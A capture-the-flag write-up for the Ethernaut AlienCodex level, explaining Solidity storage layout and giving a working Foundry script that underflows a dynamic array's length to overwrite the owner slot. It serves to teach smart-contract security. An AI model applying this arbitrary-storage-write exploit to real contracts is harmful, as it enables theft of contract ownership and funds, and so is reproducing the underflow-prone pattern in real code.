# Ethernaut Level 19 AlienCodex

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

We have to claim ownership of the contract to pass the game. Since it is a `Ownable`, so there will be a `address public owner` in the storage layout, though it is not explicitly written in the code. So the declaration order of the storage layout is: `owner`, `contact`, `codex`. Since `address` typically takes 20 bytes and `bool` takes 1 byte, `owner` and `contact` are going to be packed in slot 0, where `owner` takes last 20 bytes and `contact` takes the 1 byte on the **left**. 

For `bytes32[] public codex`, since it is an array with *dynamic* storage length, the storage strategy follows a specific  pattern: the first 32-bytes slot (in this case slot 1) will store the **length** of the array. Then the first element in the array (codex[0]) will be stored at: 

```solidity
p = uint256(keccak256(abi.encode(SLOT_INDEX_OF_CODEX_LENGTH)))
```

p is the starting slot index of array's elements. Now the storage layout looks like this:

```
 ---- Storage ---

slot 0 -> owner (20 bytes), contact (1 byte)
slot 1 -> length of codex, which first elements is at 'p' = keccak256(1)
'
'
'
'
slot p -> codex[0]
slot p + 1 -> codex[1]
'
'
slot p + n -> codex[n]
```

Note that the contract is using `pragma solidity ^0.5.0`, which still allows underflow & overflow, we can somehow use function `retract()` to reduce the length of codex to cause an *underflow* (length of `codex` will now be `2^256 - 1`), then we can access all the possible storage slots with `codex` index, including slot 0. All we have to do then is to calculate that index representing slot 0. We can now show the storage layout again:

```
---- Storage ---

slot 0 -> owner (20 bytes), contact (1 byte) -> codex[2^256 - p]
slot 1 -> length of codex, which first elements is at 'p' = keccak256(1) -> codex[2^256 - p + 1]
'
'
'
'
slot p -> codex[0]
slot p + 1 -> codex[1]
'
'
slot p + (2^256 - p - 1) -> codex[2^256 - p - 1]
```

We can see that the index `i` can meet the condition: `p + i ≡ 0 mod 2^256`. So `i` is `2^256 - p`.

`AlienCodex.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IAlienCodex} from "../src/IAlienCodex.sol";

contract AlienCodexScript is Script {
    IAlienCodex alienCodex = IAlienCodex(0xXXXXXXXXX);
    uint256 constant SLOT_INDEX_OF_CODEX_LENGTH = 1;
    uint256 slotIndexOfCodexFirstElement = uint256(keccak256(abi.encode(SLOT_INDEX_OF_CODEX_LENGTH)));
    // index i such that: p + i ≡ 0 mod 2^256 → i ≡ 2^256 − p
    uint256 indexToOverwriteOwner = type(uint256).max - slotIndexOfCodexFirstElement + 1;

    function run() external {
        vm.startBroadcast();
        console.log("Original owner:", alienCodex.owner());
        alienCodex.makeContact();
        alienCodex.retract(); // overflows the array length to 2**256 - 1
        alienCodex.revise(indexToOverwriteOwner, bytes32(uint256(uint160(msg.sender))));
        console.log("New owner:", alienCodex.owner());
        vm.stopBroadcast();
    }
}
```

In order to use `0.8.0` compiler, we don't include original code in our project. Instead, we use an interface:

`IAlienCodex.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}
```

